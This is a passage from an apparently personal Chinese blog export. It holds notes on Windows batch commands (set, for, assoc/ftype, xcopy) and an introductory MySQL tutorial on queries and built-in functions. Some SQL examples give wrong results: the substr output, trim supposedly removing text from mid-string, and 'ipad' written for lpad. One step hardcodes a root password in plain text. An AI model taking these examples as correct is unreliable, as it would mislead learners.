。所以用到&quot;命令扩展名&quot;的程</span><br><span class="line">序，建议在开头和结尾加上 SETLOCAL ENABLEEXTENSIONS 和 ENDLOCAL 语句，以确</span><br><span class="line">保程序能在其它系统上正确运行</span><br><span class="line">&quot;延缓环境变量扩充&quot;主要用于 if 和 for 的符合语句，在 set 的说明里有其实用例程</span><br></pre></td></tr></table></figure><h3 id="命令31-39"><a href="#命令31-39" class="headerlink" title="命令31~39"></a>命令31~39</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">31 set</span><br><span class="line">设置变量</span><br><span class="line">引用变量可在变量名前后加 % ，即 %变量名%</span><br><span class="line">set #显示目前所有可用的变量，包括系统变量和自定义的变量</span><br><span class="line">echo %SystemDrive% #显示系统盘盘符。系统变量可以直接引用</span><br><span class="line">set p #显示所有以p开头的变量，要是一个也没有就设errorlevel=1</span><br><span class="line">set p=aa1bb1aa2bb2 #设置变量p，并赋值为 = 后面的字符串，即aa1bb1aa2bb2</span><br><span class="line">echo %p% #显示变量p代表的字符串，即aa1bb1aa2bb2</span><br><span class="line">echo %p:~6% #显示变量p中第6个字符以后的所有字符，即aa2bb2</span><br><span class="line">echo %p:~6,3% #显示第6个字符以后的3个字符，即aa2</span><br><span class="line">echo %p:~0,3% #显示前3个字符，即aa1</span><br><span class="line">echo %p:~-2% #显示最后面的2个字符，即b2</span><br><span class="line">echo %p:~0,-2% #显示除了最后2个字符以外的其它字符，即aa1bb1aa2b</span><br><span class="line">echo %p:aa=c% #用c替换变量p中所有的aa，即显示c1bb1c2bb2</span><br><span class="line">echo %p:aa=% #将变量p中的所有aa字符串置换为空，即显示1bb12bb2</span><br><span class="line">echo %p:*bb=c% #第一个bb及其之前的所有字符被替换为c，即显示c1aa2bb2</span><br><span class="line">set p=%p:*bb=c% #设置变量p，赋值为 %p:*bb=c% ，即c1aa2bb2</span><br><span class="line">set /a p=39 #设置p为数值型变量，值为39</span><br><span class="line">set /a p=39/10 #支持运算符，有小数时用去尾法，39/10=3.9，去尾得3，p=3</span><br><span class="line">set /a p=p/10 #用 /a 参数时，在 = 后面的变量可以不加%直接引用</span><br><span class="line">set /a p=”1&amp;0″ #”与”运算，要加引号。其它支持的运算符参见set/?</span><br><span class="line">set p= #取消p变量</span><br><span class="line">set /p p=请输入</span><br><span class="line">屏幕上显示”请输入”，并会将输入的字符串赋值给变量p</span><br><span class="line">注意这条可以用来取代 choice 命令</span><br><span class="line">注意变量在 if 和 for 的复合语句里是一次性全部替换的，如</span><br><span class="line">@echo off</span><br><span class="line">set p=aaa</span><br><span class="line">if %p%==aaa (</span><br><span class="line">echo %p%</span><br><span class="line">set p=bbb</span><br><span class="line">echo %p%</span><br><span class="line">)</span><br><span class="line">结果将显示</span><br><span class="line">aaa</span><br><span class="line">aaa</span><br><span class="line">因为在读取 if 语句时已经将所有 %p% 替换为aaa</span><br><span class="line">这里的&quot;替换&quot;，在 /? 帮助里就是指&quot;扩充&quot;、&quot;环境变量扩充&quot;</span><br><span class="line">可以启用”延缓环境变量扩充”，用 ! 来引用变量，即 !变量名!</span><br><span class="line">@echo off</span><br><span class="line">SETLOCAL ENABLEDELAYEDEXPANSION</span><br><span class="line">set p=aaa</span><br><span class="line">if %p%==aaa (</span><br><span class="line">echo %p%</span><br><span class="line">set p=bbb</span><br><span class="line">echo !p!</span><br><span class="line">)</span><br><span class="line">ENDLOCAL</span><br><span class="line">结果将显示</span><br><span class="line">aaa</span><br><span class="line">bbb</span><br><span class="line">还有几个动态变量，运行 set 看不到</span><br><span class="line">%CD% #代表当前目录的字符串</span><br><span class="line">%DATE% #当前日期</span><br><span class="line">%TIME% #当前时间</span><br><span class="line">%RANDOM% #随机整数，介于0~32767</span><br><span class="line">%ERRORLEVEL% #当前 ERRORLEVEL 值</span><br><span class="line">%CMDEXTVERSION% #当前命令处理器扩展名版本号</span><br><span class="line">%CMDCMDLINE% #调用命令处理器的原始命令行</span><br><span class="line">可以用echo命令查看每个变量值，如 echo %time%</span><br><span class="line">注意 %time% 精确到毫秒，在批处理需要延时处理时可以用到</span><br><span class="line"></span><br><span class="line">32 start</span><br><span class="line">批处理中调用外部程序的命令，否则等外部程序完成后才继续执行剩下的指令</span><br><span class="line"></span><br><span class="line">33 call</span><br><span class="line">批处理中调用另外一个批处理的命令，否则剩下的批处理指令将不会被执行</span><br><span class="line">有时有的应用程序用start调用出错的，也可以call调用</span><br><span class="line"></span><br><span class="line">34 choice (外部命令)</span><br><span class="line">选择命令</span><br><span class="line">让用户输入一个字符，从而选择运行不同的命令，返回码errorlevel为1234……</span><br><span class="line">win98里是choice.com</span><br><span class="line">win2000pro里没有，可以从win98里拷过来</span><br><span class="line">win2003里是choice.exe</span><br><span class="line">choice /N /C y /T 5 /D y&gt;nul</span><br><span class="line">延时5秒</span><br><span class="line"></span><br><span class="line">35 assoc 和 ftype</span><br><span class="line">文件关联</span><br><span class="line">assoc 设置&#x27;文件扩展名&#x27;关联，关联到&#x27;文件类型&#x27;</span><br><span class="line">ftype 设置&#x27;文件类型&#x27;关联，关联到&#x27;执行程序和参数&#x27;</span><br><span class="line">当你双击一个.txt文件时，windows并不是根据.txt直接判断用 notepad.exe 打开</span><br><span class="line">而是先判断.txt属于 txtfile &#x27;文件类型&#x27;</span><br><span class="line">再调用 txtfile 关联的命令行 txtfile=%SystemRoot%system32NOTEPAD.EXE %1</span><br><span class="line">可以在&quot;文件夹选项&quot;→&quot;文件类型&quot;里修改这2种关联</span><br><span class="line">assoc #显示所有&#x27;文件扩展名&#x27;关联</span><br><span class="line">assoc .txt #显示.txt代表的&#x27;文件类型&#x27;，结果显示 .txt=txtfile</span><br><span class="line">assoc .doc #显示.doc代表的&#x27;文件类型&#x27;，结果显示 .doc=Word.Document.8</span><br><span class="line">assoc .exe #显示.exe代表的&#x27;文件类型&#x27;，结果显示 .exe=exefile</span><br><span class="line">ftype #显示所有&#x27;文件类型&#x27;关联</span><br><span class="line">ftype exefile #显示exefile类型关联的命令行，结果显示 exefile=&quot;%1&quot; %*</span><br><span class="line">assoc .txt=Word.Document.8</span><br><span class="line">设置.txt为word类型的文档，可以看到.txt文件的图标都变了</span><br><span class="line">assoc .txt=txtfile</span><br><span class="line">恢复.txt的正确关联</span><br><span class="line">ftype exefile=&quot;%1&quot; %*</span><br><span class="line">恢复 exefile 的正确关联</span><br><span class="line">如果该关联已经被破坏，可以运行 command.com ，再输入这条命令</span><br><span class="line"></span><br><span class="line">36 pushd 和 popd</span><br><span class="line">切换当前目录</span><br><span class="line">@echo off</span><br><span class="line">c: &amp; cd &amp; md mp3 #在 C: 建立 mp3 文件夹</span><br><span class="line">md d:mp4 #在 D: 建立 mp4 文件夹</span><br><span class="line">cd /d d:mp4 #更改当前目录为 d:mp4</span><br><span class="line">pushd c:mp3 #保存当前目录，并切换当前目录为 c:mp3</span><br><span class="line">popd #恢复当前目录为刚才保存的 d:mp4</span><br><span class="line"></span><br><span class="line">37 for</span><br><span class="line">循环命令</span><br><span class="line">这个比较复杂，请对照 for/? 来看</span><br><span class="line">for %%i in (c: d: e: f:) do echo %%i</span><br><span class="line">依次调用小括号里的每个字符串，执行 do 后面的命令</span><br><span class="line">注意%%i，在批处理中 for 语句调用参数用2个%</span><br><span class="line">默认的字符串分隔符是&quot;空格键&quot;，&quot;Tab键&quot;，&quot;回车键&quot;</span><br><span class="line">for %%i in (*.txt) do find &quot;abc&quot; %%i</span><br><span class="line">对当前目录里所有的txt文件执行 find 命令</span><br><span class="line">for /r . %%i in (*.txt) do find &quot;abc&quot; %%i</span><br><span class="line">在当前目录和子目录里所有的.txt文件中搜索包含 abc 字符串的行</span><br><span class="line">for /r . %%i in (.) do echo %%~pni</span><br><span class="line">显示当前目录名和所有子目录名，包括路径，不包括盘符</span><br><span class="line">for /r d:mp3 %%i in (*.mp3) do echo %%i&gt;&gt;d:mp3.txt</span><br><span class="line">把 d:mp3 及其子目录里的mp3文件的文件名都存到 d:mp3.txt 里去</span><br><span class="line">for /l %%i in (2,1,8) do echo %%i</span><br><span class="line">生成2345678的一串数字，2是数字序列的开头，8是结尾，1表示每次加1</span><br><span class="line">for /f %%i in (&#x27;set&#x27;) do echo %%i</span><br><span class="line">对 set 命令的输出结果循环调用，每行一个</span><br><span class="line">for /f &quot;eol=P&quot; %%i in (&#x27;set&#x27;) do echo %%i</span><br><span class="line">取 set 命令的输出结果，忽略以 P 开头的那几行</span><br><span class="line">for /f %%i in (d:mp3.txt) do echo %%i</span><br><span class="line">显示 d:mp3.txt 里的每个文件名，每行一个，不支持带空格的名称</span><br><span class="line">for /f &quot;delims=&quot; %%i in (d:mp3.txt) do echo %%i</span><br><span class="line">显示 d:mp3.txt 里的每个文件名，每行一个，支持带空格的名称</span><br><span class="line">for /f &quot;skip=5 tokens=4&quot; %%a in (&#x27;dir&#x27;) do echo %%a</span><br><span class="line">对 dir 命令的结果，跳过前面5行，余下的每行取第4列</span><br><span class="line">每列之间的分隔符为默认的&quot;空格&quot;</span><br><span class="line">可以注意到 dir 命令输出的前5行是没有文件名的</span><br><span class="line">for /f &quot;tokens=1,2,3 delims=- &quot; %%a in (&#x27;date /t&#x27;) do (</span><br><span class="line">echo %%a</span><br><span class="line">echo %%b</span><br><span class="line">echo %%c</span><br><span class="line">)</span><br><span class="line">对 date /t 的输出结果，每行取1、2、3列</span><br><span class="line">第一列对应指定的 %%a ，后面的 %%b 和 %%c 是派生出来的，对应其它列</span><br><span class="line">分隔符指定为 - 和&quot;空格&quot;，注意 delims=- 后面有个&quot;空格&quot;</span><br><span class="line">其中 tokens=1,2,3 若用 tokens=1-3 替换，效果是一样的</span><br><span class="line">for /f &quot;tokens=2* delims=- &quot; %%a in (&#x27;date /t&#x27;) do echo %%b</span><br><span class="line">取第2列给 %%a ，其后的列都给 %%b</span><br><span class="line"></span><br><span class="line">38 subst (外部命令)</span><br><span class="line">映射磁盘。</span><br><span class="line">subst z: serverd #这样输入z:就可以访问serverd了</span><br><span class="line">subst z: /d #取消该映射</span><br><span class="line">subst #显示目前所有的映时</span><br><span class="line"></span><br><span class="line">39 xcopy (外部命令)</span><br><span class="line">文件拷贝</span><br><span class="line">xcopy d:mp3 e:mp3 /s/e/i/y</span><br><span class="line">复制 d:mp3 文件夹、所有子文件夹和文件到 e: ，覆盖已有文件</span><br><span class="line">加 /i 表示如果 e: 没有 mp3 文件夹就自动新建一个，否则会有询问</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> win10 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> win10 </tag>
            
            <tag> bat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL学习（一）</title>
      <link href="/2020/09/14/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2020/09/14/%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="数据库的学习（一）"><a href="#数据库的学习（一）" class="headerlink" title="数据库的学习（一）"></a>数据库的学习（一）</h1><ul><li><a href="https://www.bilibili.com/video/BV12b411K7Zu/?p=28">相关视频链接</a></li></ul><h2 id="数据库及其概念"><a href="#数据库及其概念" class="headerlink" title="数据库及其概念"></a>数据库及其概念</h2><ul><li>DB 数据库</li><li>DBMS 数据库管理系统，如Mysql， MongoDB 等，用来管理与操作DB</li><li>SQL  管理数据库的语言，几乎被所有的DBMS支持</li><li>DB是大宅子，DBMS是宅子管家，SQL是管家的指挥口令</li></ul><span id="more"></span><h3 id="数据库管理的特点"><a href="#数据库管理的特点" class="headerlink" title="数据库管理的特点"></a>数据库管理的特点</h3><ol><li>先将数据放到 “一张表” 中， 在将表放到仓库中</li><li>一个数据库中存放多张表，每张表都有自己独特的名字，用来标识自己</li><li>数据库中的每张表都有自己的类别，有自己的门派，参照python的  “类”</li><li>表是由列组成，也称为字段，相当与python中的  “属性”</li><li>表是按行储存的，每一行相当与python中的  ”对象“</li></ol><ul><li>端口号port 3306</li></ul><h3 id="Linux-系统-Mysql-相关事项"><a href="#Linux-系统-Mysql-相关事项" class="headerlink" title="Linux 系统 Mysql 相关事项"></a>Linux 系统 Mysql 相关事项</h3><ul><li><p>检查电脑是否存在Mysql ：whereis mysql  或者输入  mysql –version</p></li><li><p>systemctl start mysql.service 启动  或者 service mysql start<br>systemctl stop mysql.service 停止  或者 service mysql stop<br>systemctl restart mysql.service 重启</p></li><li><p>检查电脑是否启动或关闭数据库：ps aux | grep mysqld  或者  pidof mysqld<br><a href="https://blog.csdn.net/qq_31083947/article/details/90248565">相关检查操作链接</a></p></li></ul><h3 id="数据库常用命令"><a href="#数据库常用命令" class="headerlink" title="数据库常用命令"></a>数据库常用命令</h3><ol><li>进入管理系统时时查看有那些数据库</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure><ol start="2"><li>进入库</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 库的名称;</span><br></pre></td></tr></table></figure><ol start="3"><li>查看库里有哪些表</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure><ol start="4"><li>从现在所在的库中查看别的库中存有的表</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show tables from 库的名称;</span><br></pre></td></tr></table></figure><ol start="5"><li>查看现在在哪个库</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select database();</span><br></pre></td></tr></table></figure><ol start="6"><li>查看表的内容</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc 表的名称;</span><br></pre></td></tr></table></figure><ol start="7"><li>创建表</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table 表名（</span><br><span class="line">列名 列类型，</span><br><span class="line">列名 列类型，</span><br><span class="line">...</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="SQL语法规范"><a href="#SQL语法规范" class="headerlink" title="SQL语法规范"></a>SQL语法规范</h3><ol><li>不区分大小写，但建议关键字大写，表名，列名小写</li><li>每行命令u最好用分号结尾</li><li>每行命令根据需要，可以进行缩进，或换行</li><li>SQL语法中索引从1开始</li><li>注释 </li></ol><ul><li>单行注释：#注释文字</li><li>单行注释：– 注释文字（注意横杠后面有空格）</li><li>多行注释：/× 注释文字 ×/</li></ul><h3 id="使用-DBMS-图形化界面以及命令行登录时出现错误解决"><a href="#使用-DBMS-图形化界面以及命令行登录时出现错误解决" class="headerlink" title="使用 DBMS 图形化界面以及命令行登录时出现错误解决"></a>使用 DBMS 图形化界面以及命令行登录时出现错误解决</h3><ul><li><a href="https://www.cnblogs.com/leolztang/p/5094930.html">原文链接</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~$ mysql -u root -p</span><br><span class="line">Enter password: </span><br><span class="line">ERROR 1698 (28000): Access denied for user &#x27;root&#x27;@&#x27;localhost&#x27;</span><br></pre></td></tr></table></figure><ul><li>解决</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 强制登录</span><br><span class="line">sudo mysql</span><br><span class="line"></span><br><span class="line">select user, plugin from mysql.user;</span><br><span class="line"></span><br><span class="line">update mysql.user set authentication_string=PASSWORD(&#x27;hero1314&#x27;), plugin=&#x27;mysql_native_password&#x27; where user=&#x27;root&#x27;;</span><br><span class="line"></span><br><span class="line">flush privileges;</span><br><span class="line"></span><br><span class="line">sudo service mysql restart</span><br></pre></td></tr></table></figure><h2 id="数据库语言的学习"><a href="#数据库语言的学习" class="headerlink" title="数据库语言的学习"></a>数据库语言的学习</h2><h3 id="DQL语言的学习"><a href="#DQL语言的学习" class="headerlink" title="DQL语言的学习"></a>DQL语言的学习</h3><h4 id="1、基础查询"><a href="#1、基础查询" class="headerlink" title="1、基础查询"></a>1、基础查询</h4><ul><li>语法</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 查询列表 from 表名;</span><br></pre></td></tr></table></figure><ul><li>特点：</li></ul><ol><li>查询列表可以是：表中的字段，常量值，表达式，函数</li><li>查询结果是一个虚拟的表格，只是将结果用表格呈现出来而已</li></ol><ul><li>查询字段</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 字段一，字段二 from 表格;    //字段之间用逗号隔开</span><br><span class="line">select * from 表格;  // 查询所有字段</span><br></pre></td></tr></table></figure><ul><li><p>着重号 `  （1的旁边的那个），用来标识字段</p></li><li><p>查询常量值：select ‘ 字符或字符串 ’ ;</p></li><li><p>起别名</p><p>​    别名有空格时，应用空格将别名括起来</p><p>​    注意：如果为表起了别名，则查询的字段就不能使用原来的表名去限定 </p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段值 as 别名;  // as可以省略</span><br></pre></td></tr></table></figure><ul><li>去重：在被查询的字段之前加上关键字 distinct</li><li>+ 号的作用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select 100+90; // 俩个操作数都为数值型，则做加法运算</span><br><span class="line"># 结果：190</span><br><span class="line">select &#x27;100&#x27;+90;  // 俩个数中若有一方为字符串，则将进行转换，若转换成功，则将继续做加法运算，若转换失败，则将字符型数值转换成再在进行加法运算</span><br><span class="line"># 结果：190</span><br><span class="line">select null+10; //若有一个方为null，则结果肯定为null</span><br></pre></td></tr></table></figure><ul><li>ifnull( ) 函数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select IFNULL(字段，0) as 别名; //若该字段真未NULL，则输出0,否则则输出该字段的值</span><br></pre></td></tr></table></figure><h4 id="2、条件查询"><a href="#2、条件查询" class="headerlink" title="2、条件查询"></a>2、条件查询</h4><ul><li>语法：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 查询列表 from 表名 where 筛选条件;</span><br></pre></td></tr></table></figure><ul><li>分类：</li></ul><ol><li><p>按表达条件筛选：</p><p>​        逻辑运算符：&gt; , &lt;, =, &lt;&gt; , &lt;=, &gt;=</p><p>​        注意：&lt;&gt;为不等于的意思</p></li><li><p>按逻辑表达式筛选：</p><p>​        &amp;&amp;， ||， ！</p><p>​        and，or，not   // SQL推荐使用</p></li><li><p>模糊查询</p><p>​        like, between and, in, is null</p><ul><li>between and 等价与  &gt;=  and &lt;=</li></ul><p>模糊查询通常与通配符一起使用  (in 不支持)</p><ul><li><p>常见通配符：% 匹配任意一个或零个</p><p>​                     _  (下划线) 匹配任意一个</p><ul><li>支持对通配符进行转义</li></ul></li></ul></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段 from 表名 where like &#x27;_$_&#x27; escape &#x27;$&#x27;; //使用$符号对下划线进行转义</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select × from 表名 where like %a%;</span><br></pre></td></tr></table></figure><ol start="4"><li>安全等于  &lt;=&gt; : 可以判断显示NULL</li></ol><h4 id="3、排序查询"><a href="#3、排序查询" class="headerlink" title="3、排序查询"></a>3、排序查询</h4><ul><li>语法：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select 字段</span><br><span class="line">from 表</span><br><span class="line">where 筛选条件</span><br><span class="line">order by 排序列表 asc|desc   //不写关键字，默认是asc</span><br><span class="line"># asc 从低到高 （升序）</span><br><span class="line"># desc 从高到底 （降序）</span><br></pre></td></tr></table></figure><ul><li>支持别名排序， 运算表达式排序</li><li>支持对多个列表进行先后排序查询，列表间用逗号隔开</li><li>排序语句一般是放在查询语句的最后面</li></ul><h4 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h4><ul><li>类似python中的方法</li><li>函数可以嵌套使用</li><li>分类：</li></ul><ol><li>单行函数：concat, length, ifnull等</li><li>分组函数：<ul><li>功能：做统计使用，又称为统计函数，聚合函数，组函数</li></ul></li></ol><h5 id="单行函数"><a href="#单行函数" class="headerlink" title="单行函数"></a>单行函数</h5><h6 id="一、字符函数"><a href="#一、字符函数" class="headerlink" title="一、字符函数"></a>一、字符函数</h6><ol><li>length </li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select length(&#x27;str&#x27;);</span><br></pre></td></tr></table></figure><ol start="2"><li>concat ( ) 拼接函数</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">concat(str1, str2 ,..., str n); //拼接字符串字段进行查询，字段之间用逗号隔开</span><br><span class="line"># 若str中有值为NULL，则查询的所有值为NULL</span><br></pre></td></tr></table></figure><ol start="3"><li><p>upper( ), lower( ) :改变大小写</p></li><li><p>substr( ) ：截取字符函数</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select substr(&#x27;今天买了个大白菜&#x27;， 6);</span><br><span class="line">结果: 大白菜</span><br><span class="line">select substr(&#x27;今天买了个大白菜&#x27;， 3, 4);</span><br><span class="line">结果: 买了</span><br></pre></td></tr></table></figure><ol start="5"><li>instr( ) :返回字串第一个字符的索引，没有则返回0</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select instr(&#x27;今天买了个大白菜&#x27;， &#x27;大白菜&#x27;);</span><br><span class="line">结果：6</span><br></pre></td></tr></table></figure><ol start="6"><li>trim( ) :去掉字段中的空格或指定字符</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select trim(&#x27;烂的&#x27; from &#x27;今天买了个烂的大白菜&#x27;);</span><br><span class="line">结果：今天买了个大白菜</span><br></pre></td></tr></table></figure><ol start="7"><li><p>lpad( ): 左填充指定长度的字符，</p><p>rpad( ): 右填充指定长度的字符</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select ipad(&#x27;大白菜&#x27;, 6, &#x27;*&#x27;);</span><br><span class="line">结果：×××大白菜</span><br><span class="line">select rpad(&#x27;大白菜&#x27;, 6, &#x27;*&#x27;);</span><br><span class="line">结果：大白菜×××</span><br></pre></td></tr></table></figure><ol start="8"><li>replace 替换</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select replace(&#x27;今天买了个大白菜&#x27;, &#x27;大白菜&#x27;, &#x27;胡萝卜&#x27;);</span><br><span class="line">结果：今天买了个胡萝卜</span><br></pre></td></tr></table></figure><h6 id="二、数学函数"><a href="#二、数学函数" class="headerlink" title="二、数学函数"></a>二、数学函数</h6><ol><li>round( ) : 四舍五入函数</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select round(1.1236);  //默认保留整数部分</span><br><span class="line">结果：1</span><br><span class="line">select round(1.1236, 3);  //可指定保留小数部分</span><br><span class="line">结果：1.124</span><br></pre></td></tr></table></figure><ol start="2"><li>ceil( ): 向上取整，返回 &gt;= 该函数的最小整数</li><li>floor( ): 向下取整，返回  &lt;= 该函数的最大整数</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select floor(-9.99);</span><br><span class="line">结果：-10</span><br></pre></td></tr></table></figure><ol start="4"><li>truncate 截断函数，截断小数点后指定的位数</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select truncate(1.123, 2);</span><br><span class="line">结果：1.12</span><br></pre></td></tr></table></figure><ol start="5"><li>mod( ): 取模（取余）函数</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select mod(10,3);</span><br><span class="line">结果：1</span><br></pre></td></tr></table></figure><h6 id="三、日期函数"><a href="#三、日期函数" class="headerlink" title="三、日期函数"></a>三、日期函数</h6><ol><li>now( ) 返回当前系统日期+时间</li><li>curdate( ) 返回当前系统日期，不返回时间</li><li>curtime( ) 返回当前时间，不返回日期</li><li>str_to_date( ) 将日期格式的字符转换成指定格式的日期</li><li>date_format( ) 